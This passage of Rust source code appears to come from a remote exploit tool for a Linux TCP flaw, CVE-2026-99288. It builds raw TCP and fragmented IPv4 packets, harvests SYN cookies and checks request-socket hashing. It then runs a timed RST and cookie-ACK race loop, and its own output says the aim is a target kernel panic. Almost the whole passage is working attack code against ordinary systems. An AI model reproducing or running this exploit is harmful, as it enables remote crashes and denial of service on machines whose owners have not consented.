            let request_sequence = self.random_u32();
            let mark = self.sniffer.state.mark(port);
            self.send_segment(port, request_sequence, 0, FLAG_SYN, true, 0);
            let request_isn = self
                .wait_synack(port, request_sequence, mark, self.synack_timeout)
                .ok_or_else(|| {
                    io::Error::new(
                        io::ErrorKind::TimedOut,
                        "no SYN-ACK while creating the request socket",
                    )
                })?;
            println!("      request server_isn=0x{request_isn:08x}");

            println!("[4/5] checking the established hash lookup");
            let request_present = self.probe_tuple(port, request_sequence, false);
            match request_present {
                1 => println!("      request socket is hashed (challenge ACK received)"),
                0 => {
                    self.junk_drain_all();
                    return Err(io::Error::other(
                        "request socket is absent: the tuple took the cookie path again",
                    ));
                }
                _ => {
                    self.junk_drain_all();
                    return Err(io::Error::new(
                        io::ErrorKind::TimedOut,
                        "no response to the request-socket challenge probe",
                    ));
                }
            }

            println!("[5/5] sending RST followed by the cookie ACK");
            self.send_segment(
                port,
                request_sequence.wrapping_add(1),
                0,
                FLAG_RST,
                false,
                0,
            );
            self.spin_gap(self.config.alloc_gap_us);
            self.send_segment(
                port,
                harvest_sequence.wrapping_add(1),
                cookie.wrapping_add(1),
                FLAG_ACK,
                false,
                0,
            );
            self.send_segment(
                port,
                harvest_sequence.wrapping_add(1),
                0,
                FLAG_RST,
                false,
                0,
            );
            thread::sleep(Duration::from_millis(100));
            self.junk_drain_all();
            self.stats.synacks = self.sniffer.state.synacks.load(Ordering::Relaxed);
            println!(
                "[+] verify complete; check SyncookiesRecv and EmbryonicRsts on the target (packets={} send_errors={} synacks={})",
                self.stats.packets, self.stats.send_errors, self.stats.synacks
            );
            Ok(())
        }

        fn mode_race(&mut self) -> io::Result<()> {
            println!("[preflight 1/2] checking packets, fragmentation and host RSTs");
            self.mode_probe()?;
            println!("[preflight 2/2] checking SYN cookies and request sockets");
            self.mode_verify()?;
            println!("[+] preflight passed; starting the race");
            if let Ok(path) = std::env::var("NOISYTCP_GDB_READY") {
                let path = std::path::Path::new(&path);
                let deadline = Instant::now() + Duration::from_secs(60);
                while !path.exists() && Instant::now() < deadline {
                    thread::sleep(Duration::from_micros(50));
                }
                if std::fs::remove_file(path).is_err() {
                    return Err(io::Error::new(
                        io::ErrorKind::TimedOut,
                        "GDB initialization timed out",
                    ));
                }
            }
            let fill = self.calibrated_fill;
            let batch = if self.config.batch == 0 {
                fill.clamp(1, MAX_BATCH)
            } else {
                self.config.batch
            };
            println!(
                "[*] race batch={batch} readers={} fill={fill} gaps={}/{}/{} us jitter={} us",
                self.config.readers,
                self.config.frag_gap_us,
                self.config.free_gap_us,
                self.config.alloc_gap_us,
                self.config.jitter_us
            );
            println!("Ctrl+C to stop; only a target kernel log can confirm the panic");
            let started = Instant::now();
            let deadline = (self.config.duration != 0)
                .then(|| started + Duration::from_secs(self.config.duration));
            let mut next_report = started + Duration::from_secs(5);
            while !STOP.load(Ordering::Acquire) {
                if deadline.is_some_and(|deadline| Instant::now() >= deadline) {
                    break;
                }
                self.run_round(batch);
                if Instant::now() >= next_report {
                    self.stats.synacks = self.sniffer.state.synacks.load(Ordering::Relaxed);
                    let elapsed = started.elapsed().as_secs_f64();
                    println!(
                        "[{:6.1}s] rounds={} attempts={} ({:.0}/s) cookies={} synacks={} packets={} timeouts={} send_errors={}",
                        elapsed,
                        self.stats.rounds,
                        self.stats.attempts,
                        self.stats.attempts as f64 / elapsed.max(0.001),
                        self.stats.cookies,
                        self.stats.synacks,
                        self.stats.packets,
                        self.stats.timeouts,
                        self.stats.send_errors
                    );
                    next_report = Instant::now() + Duration::from_secs(5);
                }
            }
            self.junk_drain_all();
            self.cleanup_previous();
            self.stats.synacks = self.sniffer.state.synacks.load(Ordering::Relaxed);
            println!(
                "[+] stopped: rounds={} attempts={} cookies={} synacks={} packets={} timeouts={} send_errors={}",
                self.stats.rounds,
                self.stats.attempts,
                self.stats.cookies,
                self.stats.synacks,
                self.stats.packets,
                self.stats.timeouts,
                self.stats.send_errors
            );
            if self.stats.cookies == 0 {
                println!("[!] no cookies were harvested; no race attempt was possible");
            }
            Ok(())
        }
    }

    impl Drop for Engine {
        fn drop(&mut self) {
            self.junk_drain_all();
            self.cleanup_previous();
        }
    }

    pub fn run(config: Config) -> io::Result<()> {
        STOP.store(false, Ordering::Release);
        unsafe {
            libc::signal(libc::SIGINT, stop_signal as *const () as libc::sighandler_t);
            libc::signal(
                libc::SIGTERM,
                stop_signal as *const () as libc::sighandler_t,
            );
        }
        let source = local_address(config.target, config.port)?;
        let interface = interface_name_for_address(source)?;
        let interface_name = CString::new(interface.as_str()).map_err(|_| {
            invalid_input("the network interface name contains an unexpected NUL byte")
        })?;
        let interface_index = unsafe { libc::if_nametoindex(interface_name.as_ptr()) };
        if interface_index == 0 {
            return Err(io::Error::last_os_error());
        }
        println!(
            "[*] mode={:?} target={}:{} source={} dev={} ports={}..{}",
            config.mode,
            config.target,
            config.port,
            source,
            interface,
            config.source_port,
            usize::from(config.source_port) + config.source_port_count - 1
        );
        let sender = RawSocket::sender(config.mark)?;
        let sniffer = Sniffer::start(
            interface_index as i32,
            source,
            config.target,
            config.port,
            config.debug,
        )?;
        let filter = RstFilter::install(&config)?;
        let mut engine = Engine::new(config, source, sender, sniffer, filter);
        match engine.config.mode {
            Mode::Probe => engine.mode_probe(),
            Mode::Verify => engine.mode_verify(),
            Mode::Race => engine.mode_race(),
        }
    }

    fn local_address(target: Ipv4Addr, port: u16) -> io::Result<Ipv4Addr> {
        let socket = UdpSocket::bind((Ipv4Addr::UNSPECIFIED, 0))?;
        socket.connect(SocketAddr::from((target, port)))?;
        match socket.local_addr()?.ip() {
            std::net::IpAddr::V4(address) if !address.is_unspecified() => Ok(address),
            _ => Err(io::Error::new(
                io::ErrorKind::AddrNotAvailable,
                "an IPv4 source address is required",
            )),
        }
    }

    fn interface_name_for_address(source: Ipv4Addr) -> io::Result<String> {
        let expected = u32::from_ne_bytes(source.octets());
        unsafe {
            let mut addresses = ptr::null_mut();
            if libc::getifaddrs(&mut addresses) != 0 {
                return Err(io::Error::last_os_error());
            }
            let mut current = addresses;
            let mut result = None;
            while !current.is_null() {
                let entry = &*current;
                if !entry.ifa_addr.is_null()
                    && (*entry.ifa_addr).sa_family == libc::AF_INET as libc::sa_family_t
                {
                    let address = &*(entry.ifa_addr as *const libc::sockaddr_in);
                    if address.sin_addr.s_addr == expected {
                        result = Some(
                            CStr::from_ptr(entry.ifa_name)
                                .to_string_lossy()
                                .into_owned(),
                        );
                        break;
                    }
                }
                current = entry.ifa_next;
            }
            libc::freeifaddrs(addresses);
            result.ok_or_else(|| {
                io::Error::new(
                    io::ErrorKind::NotFound,
                    format!("cannot find the interface owning source address {source}"),
                )
            })
        }
    }

    fn raw_socket_error() -> io::Error {
        let error = io::Error::last_os_error();
        io::Error::new(
            error.kind(),
            format!("{error}; raw sockets require root or CAP_NET_RAW"),
        )
    }

    fn invalid_input(message: impl Into<String>) -> io::Error {
        io::Error::new(io::ErrorKind::InvalidInput, message.into())
    }

    fn socket_address(address: Ipv4Addr) -> libc::sockaddr_in {
        libc::sockaddr_in {
            sin_family: libc::AF_INET as libc::sa_family_t,
            sin_port: 0,
            sin_addr: libc::in_addr {
                s_addr: u32::from_ne_bytes(address.octets()),
            },
            sin_zero: [0; 8],
        }
    }

    fn tcp_packet(
        source: Ipv4Addr,
        target: Ipv4Addr,
        target_port: u16,
        spec: SegmentSpec,
    ) -> Vec<u8> {
        let option_len = if spec.mss { 4 } else { 0 };
        let header_len = 20 + option_len;
        let mut tcp = vec![0u8; header_len + spec.payload_len];
        tcp[0..2].copy_from_slice(&spec.source_port.to_be_bytes());
        tcp[2..4].copy_from_slice(&target_port.to_be_bytes());
        tcp[4..8].copy_from_slice(&spec.sequence.to_be_bytes());
        tcp[8..12].copy_from_slice(&spec.acknowledgment.to_be_bytes());
        tcp[12] = ((header_len / 4) as u8) << 4;
        tcp[13] = spec.flags;
        tcp[14..16].copy_from_slice(&65_535u16.to_be_bytes());
        if spec.mss {
            tcp[20..24].copy_from_slice(&[2, 4, 0x05, 0xb4]);
        }
        for byte in &mut tcp[header_len..] {
            *byte = 0x41;
        }
        let sum = pseudo_header_sum(source, target, tcp.len()) + checksum_sum(&tcp);
        tcp[16..18].copy_from_slice(&finish_checksum(sum).to_be_bytes());
        tcp
    }

    fn ipv4_packet(
        source: Ipv4Addr,
        target: Ipv4Addr,
        id: u16,
        fragment_offset: usize,
        more_fragments: bool,
        payload: &[u8],
    ) -> Vec<u8> {
        let mut packet = vec![0u8; 20 + payload.len()];
        let total_length = packet.len() as u16;
        let fragment =
            ((fragment_offset / 8) as u16 & 0x1fff) | if more_fragments { 0x2000 } else { 0 };
        packet[0] = 0x45;
        packet[2..4].copy_from_slice(&total_length.to_be_bytes());
        packet[4..6].copy_from_slice(&id.to_be_bytes());
        packet[6..8].copy_from_slice(&fragment.to_be_bytes());
        packet[8] = 64;
        packet[9] = libc::IPPROTO_TCP as u8;
        packet[12..16].copy_from_slice(&source.octets());
        packet[16..20].copy_from_slice(&target.octets());
        packet[20..].copy_from_slice(payload);
        let checksum = finish_checksum(checksum_sum(&packet[..20]));
        packet[10..12].copy_from_slice(&checksum.to_be_bytes());
        packet
    }

    fn pseudo_header_sum(source: Ipv4Addr, target: Ipv4Addr, tcp_length: usize) -> u32 {
        checksum_sum(&source.octets())
            + checksum_sum(&target.octets())
            + u32::from(libc::IPPROTO_TCP as u16)
            + tcp_length as u32
    }

    fn checksum_sum(bytes: &[u8]) -> u32 {
        let mut sum = 0u32;
        let (chunks, remainder) = bytes.as_chunks::<2>();
        for chunk in chunks {
            sum += u32::from(u16::from_be_bytes(*chunk));
        }
        if let Some(last) = remainder.first() {
            sum += u32::from(*last) << 8;
        }
        sum
    }

    fn finish_checksum(mut sum: u32) -> u16 {
        while sum >> 16 != 0 {
            sum = (sum & 0xffff) + (sum >> 16);
        }
        !(sum as u16)
    }
}

#[cfg(target_os = "linux")]
pub use platform::run;

#[cfg(not(target_os = "linux"))]
pub fn run(_config: crate::Config) -> std::io::Result<()> {
    Err(std::io::Error::new(
        std::io::ErrorKind::Unsupported,
        "CVE-2026-99288 mode requires Linux raw sockets",
    ))
}
